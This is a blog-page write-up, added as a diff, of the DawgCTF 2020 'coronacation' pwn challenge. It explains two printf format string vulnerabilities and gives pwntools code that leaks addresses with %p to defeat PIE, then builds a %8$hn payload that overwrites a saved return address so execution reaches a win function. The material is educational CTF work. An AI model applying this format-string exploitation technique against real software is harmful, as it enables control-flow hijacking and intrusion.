@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <!-- title will be injected from _config.yml -->
+  <!-- Stylesheets -->
+  
+  <link rel="stylesheet" href="/assets/css/bootstrap.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="stylesheet" href="/assets/css/responsive.css">
+  <link rel="stylesheet" href="/assets/css/import_custom.css">
+
+  <link rel="shortcut icon" href="images/favicon.png" type="image/x-icon">
+  <link rel="icon" href="images/favicon.png" type="image/x-icon">
+
+  <!-- Responsive -->
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
+  <!--[if lt IE 9]><script src="js/respond.js"></script><![endif]--><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>coronacation | LetzPwn - Luxembourgish CTF Team</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="coronacation" />
+<meta name="author" content="punshLineLama" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description The challenge was in the pwn category and gave 400 points. An executable was provided." />
+<meta property="og:description" content="Description The challenge was in the pwn category and gave 400 points. An executable was provided." />
+<link rel="canonical" href="/writeup/2020/04/11/coronacation.html" />
+<meta property="og:url" content="/writeup/2020/04/11/coronacation.html" />
+<meta property="og:site_name" content="LetzPwn - Luxembourgish CTF Team" />
+<meta property="og:image" content="/img/thumbnail.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-11T23:10:05+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/img/thumbnail.png" />
+<meta property="twitter:title" content="coronacation" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"punshLineLama"},"dateModified":"2020-04-11T23:10:05+00:00","datePublished":"2020-04-11T23:10:05+00:00","description":"Description The challenge was in the pwn category and gave 400 points. An executable was provided.","headline":"coronacation","image":"/img/thumbnail.png","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup/2020/04/11/coronacation.html"},"url":"/writeup/2020/04/11/coronacation.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="LetzPwn - Luxembourgish CTF Team" /></head><body>
+  <div class="page-wrapper"><!-- Main Header -->
+<header class="main-header">
+  <!-- Header Top -->
+  <div class="header-top">
+    <div class="auto-container clearfix">
+
+      <div class="top-left clearfix">
+        <ul class="info-list">
+          <li>The first Luxembourgish CTF Team</li>
+        </ul>
+      </div>
+
+      <div class="top-right">
+        <ul class="social-icons">
+          <li><a href="https://twitter.com/LetzPwn"><span class="fab fa-twitter"></span></a></li>
+          <li><a href="https://discord.gg/Qjt5zUc"><span class="fab fa-discord"></span></a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Header Upper -->
+  <div class="header-upper">
+    <div class="inner-container">
+      <div class="auto-container clearfix">
+        <!--Logo-->
+        <div class="logo-outer">
+          <div class="logo"><a href="/"><img src="/assets/images/logo.png" alt=""
+                title="Gamon - Digital Gaming and Esports HTML Template" style="max-width: 260px;"></a></div>
+        </div>
+
+        <!--Nav Box-->
+        <div class="nav-outer clearfix">
+          <!--Mobile Navigation Toggler-->
+          <div class="mobile-nav-toggler"><span class="icon flaticon-menu-1"></span></div>
+
+          <!-- Main Menu -->
+          <nav class="main-menu navbar-expand-md navbar-light">
+            <div class="collapse navbar-collapse show clearfix" id="navbarSupportedContent">
+              <ul class="navigation clearfix pull-left">
+                
+                
+                <li class=""><a href="/">Home</a>
+                </li>
+                
+                
+                
+                <li class=""><a href="/about_us.html">About Us</a>
+                </li>
+                
+                
+                
+                <li class=""><a href="/events.html">News & CTFs</a>
+                </li>
+                
+                
+              </ul>
+
+                <ul class="navigation clearfix pull-right">
+                  
+                    
+                    <li class=""><a href="/sponsors.html">Sponsors</a> </li>
+                    
+                  
+                    
+                    <li class=""><a href="/writeups.html">Writeups</a> </li>
+                    
+                  
+                    
+                    <li class=""><a href="/contact.html">Contact</a> </li>
+                    
+                  
+                </ul>
+            </div>
+          </nav>
+          <!-- Main Menu End-->
+        </div>
+      </div>
+    </div>
+  </div>
+  <!--End Header Upper-->
+
+  <!-- Sticky Header  -->
+  <div class="sticky-header">
+    <div class="auto-container clearfix">
+      <!--Logo-->
+      <div class="logo pull-left">
+        <a href="/" title=""><img src="/assets/images/logo.png" style="max-width:100px;" alt="" title=""></a>
+      </div>
+      <!--Right Col-->
+      <div class="pull-right">
+        <!-- Main Menu -->
+        <nav class="main-menu clearfix">
+          <!--Keep This Empty / Menu will come through Javascript-->
+        </nav><!-- Main Menu End-->
+      </div>
+    </div>
+  </div><!-- End Sticky Menu -->
+
+  <!-- Mobile Menu  -->
+  <div class="mobile-menu">
+    <div class="menu-backdrop"></div>
+    <div class="close-btn"><span class="icon flaticon-close"></span></div>
+
+    <nav class="menu-box">
+      <div class="nav-logo"><a href="/"><img src="/assets/images/logo.png" alt="" title=""></a></div>
+      <div class="menu-outer">
+        <!--Here Menu Will Come Automatically Via Javascript / Same Menu as in Header-->
+      </div>
+      <!--Social Links--
+      <div class="social-links">
+        <ul class="clearfix">
+          <li><a href="#"><span class="fab fa-twitter"></span></a></li>
+          <li><a href="#"><span class="fab fa-facebook-square"></span></a></li>
+          <li><a href="#"><span class="fab fa-pinterest-p"></span></a></li>
+          <li><a href="#"><span class="fab fa-instagram"></span></a></li>
+          <li><a href="#"><span class="fab fa-youtube"></span></a></li>
+        </ul>
+      </div>-->
+    </nav>
+  </div><!-- End Mobile Menu -->
+</header>
+<!--Page Title-->
+<div itemscope itemtype="http://schema.org/BlogPosting">
+  <section class="page-banner" style="padding-bottom: 40px; background-image:url(/assets/images/background/1.png);">
+    <div class="auto-container">
+      <div class="inner-container clearfix">
+        <ul class="bread-crumb clearfix">
+          <li><a href="/index.html">Home</a></li> 
+          <li><a href="/writeups.html">Writeups</a></li>
+          <li><a href="#">Dawg CTF 2020</a></li> <!-- TODO: correct href-->
+          <li itemprop="name headline">coronacation Writeup</li>
+        </ul>
+        <h1>coronacation Writeup</h1><ul class="custom-author">
+                <li>By <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span
+                      class="p-author h-card" itemprop="name">punshLineLama</span></span>
+                </li>
+              </ul>
+              <br/><div class="custom-date">Apr 11, 2020</div>
+        <ul class="tags">
+          <li>Solves:  teams</li>
+          <li>Source: <a href="" target="_blank" rel="noopener noreferrer"></a></li>
+        </ul>
+    </div>
+  </section>
+  <!--End Page Title-->
+
+  <!--Sidebar Page Container-->
+  <div class="sidebar-page-containe" style="padding-top: 40px; background-color:#202020">
+    <div class="auto-container">
+      <div class="row clearfix">
+
+        <!--Content Side / Blog Detail-->
+        <div class="content-side col-lg-8 col-md-12 col-sm-12">
+          <div class="blog-detail">
+            <div class="lower-content writeup-content awsm" style="padding-top: 0px;">
+              <p> <h2 id="description">Description</h2>
+<p>The challenge was in the pwn category and gave 400 points.
+An executable was provided.</p>
+
+<h2 id="tldr">TL;DR</h2>
+<p>Use the first format string vulnerability to leak addresses, from which you can calculate the address of the relevant return address and <em>win</em> function.
+Then overwrite that return address with the address of the <em>win</em> function with the second format string vulnerability.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="check-security-measures">Check Security Measures</h3>
+<p>The provided binary is a 64 bit elf which is not stripped, which means that it contains the original function names such as <em>main</em> or <em>__libc_start_main</em>.
+With the <code class="language-plaintext highlighter-rouge">checksec</code> command from pwntools, one can check the implemented security measures:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      PIE enabled
+</code></pre></div></div>
+<p>We can see that the binary has no stack canary and has <strong>PIE</strong> enabled.
+<strong>PIE</strong> stands for Position-Independent-Execution. This means that the elf is loaded into a random position in  the virtual memory, instead of a fixed address.</p>
+
+<p>We also see that there is <strong>no</strong> stack canary. Thus a buffer overflow might be possible.</p>
+
+<h3 id="decompiling-the-binary">Decompiling The Binary</h3>
+<p>The next step is to decompile the binary with ghidra to examine what is going on and determine possible security flaws.</p>
+
+<p>After skimming through the code, two security critical functions can be identified, namely: <em>play_game</em> and <em>close_borders</em> (Note: <em>no_panic</em> also has a security flaw, but its basically the same as <em>close_borders</em> and only either is reached. Thus only <em>close_borders</em> is considered. If this side-note confuses you, you can just ignore it.).</p>
+
+<p>When decompiling <em>play_game</em> is looks like this:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">play_game</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">user_input</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Welcome to this choose your own adventure game!"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"You</span><span class="se">\'</span><span class="s">re President Ronald Drump and are tasked with leading the nation through this crisis."</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"So what do you want to do?"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"1. Close the borders."</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"2. Tell everyone not to panic. It</span><span class="se">\'</span><span class="s">s just the Fake News media freaking out."</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"You chose: "</span><span class="p">);</span>
+  <span class="c1">//Here comes the format string vuln:</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">user_input</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">user_input</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'1'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">close_borders</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">user_input</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'2'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">no_panic</span><span class="p">();</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>It can be seen, that its not possible to overflow the <em>user_input</em> buffer, as the <em>fgets</em> function only reads 0x32=50 bytes.</p>
+
+<p>However, just before the first if statement is a format string vulnerability.
+<em>printf</em> prints the user buffer without formatting it.
+We can use this to leak values from the stack.</p>
+
+<p>Now lets have a look at the <em>close_borders</em> function, which will get called after the <em>play_game</em> function, if the first provided character is <em>1</em> (which it will be according to our plan).</p>
+
+<p>The decompiled <em>close_borders</em> functions look like this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">close_borders</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">user_input</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">So we closed our borders. Weren</span><span class="se">\'</span><span class="s">t we doing that anyway with the wall?"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"It</span><span class="se">\'</span><span class="s">s still spreading within our borders what do we do now?"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span>
+      <span class="s">"1. Reassure everyone the country can handle this. Our healthcare system is the best. Justthe greatest."</span>
+      <span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"2. Make it a national emergency. Show the people we don</span><span class="se">\'</span><span class="s">t need Bernie</span><span class="se">\'</span><span class="s">s healthcare plan."</span><span class="p">)</span>
+  <span class="p">;</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"You chose: "</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">user_input</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">user_input</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'1'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">lose3</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">user_input</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'2'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">lose4</span><span class="p">();</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This function looks very similar to the previous function.
+Its also not possible to overflow the user buffer, but there is also a format string vulnerability.
+We will use it to overwrite the return address with the help of the addresses, which were leaked by the previous format string vulnerability.</p>
+
+<p>The plan is to leak addresses with the first format string vulnerability. With the leaked addresses, we can overwrite some return address with the address of the <em>win</em> function to get the flag.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+<p>The first step is to leak some addresses from the stack, and check if we find some useful values.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#attach debugger
+</span><span class="n">adb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="c1">#recv text from binary until its expects user input
+</span><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">out.</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="c1">#send 1 (to enter the close_border function afterwards) follow by format strings %p to print pointers
+</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="o">+</span><span class="sh">"</span><span class="s">%p.</span><span class="sh">"</span><span class="o">*</span><span class="mi">14</span><span class="p">)</span>
+<span class="c1">#receive leaked data
+</span><span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="c1">#print leaked data
+</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">leak is: </span><span class="sh">"</span><span class="o">+</span><span class="n">leak</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The leak looks something like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>leak is:You chose: 10x736f686320756f59.(nil).(nil).0x7ffe2f894c70.0xb.0x252e70252e702531.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0xa2e7025.0x55f6d7821490.0x55f6d7821080.0x7ffe2f894cc0.
+</code></pre></div></div>
+<p>When running <em>vmmap</em> in the debugger, we note that the addresses beginning with 0x7ffe2f89???? are stack or libc addresses, whereas addresses starting the 0x55f6d7821??? are addresses from the .text section, meaning the actual code of the binary.</p>
+
+<p>The leak provides us with a reference address of the stack, and a reference address of the .text section.
+We will use both addresses to circumvent <strong>PIE</strong>.
+With both reference addresses, and some offset, we can calculate the actual address of the win function, and an address of a <em>saved rip</em> register.</p>
+
+<h3 id="calculating-offsets">Calculating Offsets</h3>
+
+<p>In the debugger, we print the address of the win function (<code class="language-plaintext highlighter-rouge">p win</code> in gdb), which is: <code class="language-plaintext highlighter-rouge">0x55f6d7821165</code>.
+After setting a breakpoint in the <em>close_borders</em> function (<code class="language-plaintext highlighter-rouge">b close_borders</code> in gdb), we can examine where it return address is located (<code class="language-plaintext highlighter-rouge">info frame</code> or for short <code class="language-plaintext highlighter-rouge">i f</code> in gdb).
+This gets us: <code class="language-plaintext highlighter-rouge">0x7ffe2f894c68</code>.</p>
+
+<p>From there two values and two leaked values from the stack, we can calculate the offsets.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">.</span><span class="sh">"</span><span class="p">)</span>
+<span class="c1"># offset_win = leak[-3] - win_addr &lt;=&gt; win_addr = leak[-3] - offset_win
+</span><span class="n">offset_win</span> <span class="o">=</span> <span class="mh">0x55f6d7821080</span> <span class="o">-</span> <span class="mh">0x55f6d7821165</span>
+<span class="c1">#offset_ret = leak[-2] - ret_addr &lt;=&gt; ret_addr = leak[-2] - offset_ret
+</span><span class="n">offset_ret</span> <span class="o">=</span> <span class="mh">0x7ffe2f894cc0</span> <span class="o">-</span><span class="mh">0x7ffe2f894c68</span>
+
+<span class="n">ret_addr</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">offset_ret</span><span class="p">)</span>
+<span class="n">win_addr</span> <span class="o">=</span>  <span class="nf">p64</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">offset_win</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<h3 id="generating-the-payload">Generating The Payload</h3>
+
+<p>The preparation is done. Now we need to overwrite the return address with the win address, easy right?
+We just send the program something like: <code class="language-plaintext highlighter-rouge">ret_addr+"%"+str(first_byte)+"x%hn"+ret_addr+1+"%"+str(first_byte)+"x%hn"...</code>
+Unfortunately not. The ret_address contains null bytes.
+The <em>printf</em> function only prints until the first null byte.
+Thus we need to put the ret_addr after the format string.
+Furthermore, we can only do the <em>%n</em> once, as it needs an address to write to, and <em>ret_address</em> contains a null byte.</p>
+
+<p>As the unaltered return address points somewhere in the code segment, we only need to alter the last two bytes to let it point to <em>win</em>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">last_two_bytes</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="sh">"</span><span class="s">0x</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">offset_win</span><span class="p">))[</span><span class="o">-</span><span class="mi">4</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="c1">#change the two last bytes of the return to point to the win function
+</span><span class="n">len_last_two</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">last_two_bytes</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="n">len_last_two</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">%</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">last_two_bytes</span><span class="o">-</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="n">len_last_two</span><span class="p">))</span><span class="o">+</span><span class="sh">"</span><span class="s">x%8$hn.</span><span class="sh">"</span><span class="o">+</span><span class="n">ret_addr</span>
+</code></pre></div></div>
+
+<p>Lets have a closer look at the payload:</p>
+<ul>
+  <li>
+    <p>The first part <code class="language-plaintext highlighter-rouge">"a"*(8-len_last_two)</code> is simply some padding, such that the <em>ret_address</em> will be aligned on the stack.</p>
+  </li>
+  <li>
+    <p>The second part <code class="language-plaintext highlighter-rouge">"%"+str(last_two_bytes-(8-len_last_two))+"x"</code> writes <em>last_two_bytes</em>  many characters to the stdout (including the padding bytes from the first payload part).</p>
+  </li>
+  <li>
+    <p>The third part <code class="language-plaintext highlighter-rouge">%8$hn</code> writes the number of printed/written characters the 8th address on the stack. Which is in our case our <em>ret_addr</em> which is written to the stack in part four of the payload.</p>
+  </li>
+  <li>
+    <p>The fourth part <em>ret_addr</em> is just the return address of the stack frame</p>
+  </li>
+</ul>
+
+<p><em>Note</em>: To find at which position the <em>ret_addr</em> is, you can replace <code class="language-plaintext highlighter-rouge">%i$hn</code> with <code class="language-plaintext highlighter-rouge">%i$lx</code>, if you find that the correct return address is printed, you can replace it back to <code class="language-plaintext highlighter-rouge">%i$hn</code>.</p>
+
+<h3 id="grabbing-the-flag">Grabbing The Flag</h3>
+
+<p>After the <em>close_borders</em> function returns, the win function should be executed and we can grab the flag.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">}</span><span class="sh">"</span><span class="p">)</span>
+	<span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">DawgCTF{.*}</span><span class="sh">"</span><span class="p">,</span><span class="n">a</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">flag</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+		<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Flag is: </span><span class="sh">"</span><span class="o">+</span><span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+	<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Tadaa, and we get the flag!! :)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flag is: DawgCTF{Example_Flag}
+</code></pre></div></div>
+
+<p>(Server are already down, so I can only show off with the local example flag :P )</p>
+
+<p>The whole script and the binary and example flag are in the <code class="language-plaintext highlighter-rouge">src/</code> directory.</p>
+
+<h2 id="lessons-learned">Lessons learned</h2>
+<ul>
+  <li>Check if addresses have null bytes.</li>
+  <li>Try to overwrite as few bytes as possible</li>
+  <li>Use <code class="language-plaintext highlighter-rouge">%i$lx</code> to find the relevant address on the stack, then replacing it with <code class="language-plaintext highlighter-rouge">%i$hn</code> to overwrite the referenced memory.</li>
+  <li>always use a gdb plugin like <em>gef</em>, <em>peda</em> or <em>pwndbg</em></li>
+</ul>
+</p>
+            </div>
+          </div>
+
+          <!-- Other Options -->
+          <div class="post-share-options clearfix">
+            <!--
+            <div class="pull-left">
+              <ul class="tags">
+                <li><a href="#">Gaming</a></li>
+                <li><a href="matches.html">Matches</a></li>
+                <li><a href="#">Players</a></li>
+              </ul>
+            </div>
+            -->
+            <!--
+            <div class="social-links pull-right">
+              <ul class="social-links">
+                <li><a href="#"><span class="fab fa-twitter"></span></a></li>
+                <li><a href="#"><span class="fab fa-facebook-square"></span></a></li>
+                <li><a href="#"><span class="fab fa-pinterest-p"></span></a></li>
+                <li><a href="#"><span class="fab fa-instagram"></span></a></li>
+              </ul>
+            </div>
+            -->
+          </div>
+        </div>
+
+        <!--Sidebar Side-->
+        <div class="sidebar-side col-lg-4 col-md-12 col-sm-12">
+          <aside class="sidebar">
+
+            <!-- Tags Widget -->
+            <div class="sidebar-widget popular-tags">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Task categories</h4>
+                
+                  <a href="#">pwn</a>
+                
+                  <a href="#">format string</a>
+                
+              </div>
+            </div>
+
+            <!-- Search -->
+            <!--
+            <div class="sidebar-widget search-box">
+              <form method="post" action="contact.html">
+                <div class="form-group">
+                  <input type="search" name="search-field" value="" placeholder="Search" required>
+                  <button type="submit"><span class="icon fa fa-search"></span></button>
+                </div>
+              </form>
+            </div>
+            -->
+
+            <!-- Post Widget -->
+            <div class="sidebar-widget popular-posts">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Recent Writeups</h4>
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                <article class="post">
+                  <div class="post-inner">
+                    
+                    
+                    <figure class="post-thumb"><a href="/writeup/2019/10/27/Numtonce.html"><img src="/writeup/2019/10/27/website.png"
+                          alt=""></a></figure>
+                    <div class="post-info">Apr 11, 2020</div>
+                    <div class="text"><a href="/writeup/2019/10/27/Numtonce.html">Numtonce</a></div>
+                  </div>
+
+                </article>
+                
+                
+                
+                <article class="post">
+                  <div class="post-inner">
+                    
+                    
+                    <figure class="post-thumb"><a href="/writeup/2020/02/05/Draw_with_us.html"><img src="/writeup/2020/02/05/website.png"
+                          alt=""></a></figure>
+                    <div class="post-info">Apr 11, 2020</div>
+                    <div class="text"><a href="/writeup/2020/02/05/Draw_with_us.html">Draw with us</a></div>
+                  </div>
+
+                </article>
+                
+                
+              </div>
+            </div>
+
+            <!-- Category Widget -->
+            <!--
+            <div class="sidebar-widget categories">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Categories</h4>
+                <ul class="blog-categories">
+                  <li><a href="blog-single.html">Gaming</a></li>
+                  <li><a href="blog-single.html">Matches</a></li>
+                  <li><a href="blog-single.html">Video games</a></li>
+                  <li><a href="blog-single.html">Esports</a></li>
+                  <li><a href="blog-single.html">Champions</a></li>
+                </ul>
+              </div>
+            </div>
+            -->
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- End Sidebar Page Container -->
+
+	<!-- Main Footer -->
+  <footer class="main-footer">
+    	<div class="auto-container">
+        	<!--Widgets Section-->
+            <div class="widgets-section">
+            	<div class="row clearfix">
+                	
+                    <!--Column-->
+                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget logo-widget">
+							<div class="logo">
+                            	<a href="/index.html"><img src="/assets/images/logo.png" alt="" /></a>
+                            </div>
+							<div class="text"></div>
+						</div>
+					</div>
+					
+					<!--Column-->
+                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget links-widget">
+							<div class="widget-content">
+								<div class="footer-title">
+									<h2>Links</h2>
+								</div>
+								<div class="row clearfix">
+									<div class="column col-lg-6 col-md-6 col-sm-12">
+										<ul class="list">
+											<li><a href="/about_us.html">About</a></li>
+											<li><a href="/members.html">Our Team</a></li>
+											<li><a href="/events.html">News and CTFs</a></li>
+											<li><a href="/contact.html">Contact</a></li>
+										</ul>
+									</div>
+									<div class="column col-lg-6 col-md-6 col-sm-12">
+										<ul class="list">
+											<li><a href="/contact.html">Help & Support</a></li>
+											<li><a href="/privacy_policy.html">Privacy Policy</a></li>
+										</ul>
+									</div>
+								</div>
+							</div>	
+						</div>
+					</div>
+					
+					<!--Column                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget newsletter-widget">
+							<div class="footer-title">
+                            	<h2>Newsletter</h2>
+                            </div>
+							<div class="text">Subsrcibe us now to get the latest news and updates</div>
+							<div class="newsletter-form">
+                                <form method="post" action="contact.html">
+                                    <div class="form-group clearfix">
+                                        <input type="email" name="email" value="" placeholder="Email address" required>
+                                        <button type="submit" class="theme-btn newsletter-btn"><span class="fas fa-envelope"></span></button>
+                                    </div>
+                                </form>
+                            </div>
+						</div>
+					</div>
+					-->
+
+				</div>
+			</div>
+		</div>
+		
+		<!-- Footer Bottom -->
+		<div class="footer-bottom">
+			<div class="auto-container">
+				<!--Scroll to top-->
+				<div class="scroll-to-top scroll-to-target" data-target="html"><span class="flaticon-up-arrow"></span></div>
+				<!--Scroll to top-->
+				<div class="row clearfix">
+					<!-- Column -->
+					<div class="column col-lg-6 col-md-12 col-sm-12">
+						<div class="copyright">&copy; Copyrights, 2019 All Rights Reserved</div>
+					</div>
+					<!-- Column -->
+					<div class="column col-lg-6 col-md-12 col-sm-12">
+						<ul class="social-icons">
+							<li><a href="https://twitter.com/letzpwn"><span class="fab fa-twitter"></span></a></li>
+						</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+		
+  </footer>
+  
+</div>
+<script src="/assets/js/jquery.js"></script>
+<script src="/assets/js/popper.min.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+<script src="/assets/js/jquery-ui.js"></script>
+<script src="/assets/js/jquery.fancybox.js"></script>
+<script src="/assets/js/owl.js"></script>
+<script src="/assets/js/appear.js"></script>
+<script src="/assets/js/wow.js"></script>
+<script src="/assets/js/scrollbar.js"></script>
+<script src="/assets/js/script.js"></script></body>
+
+</html>
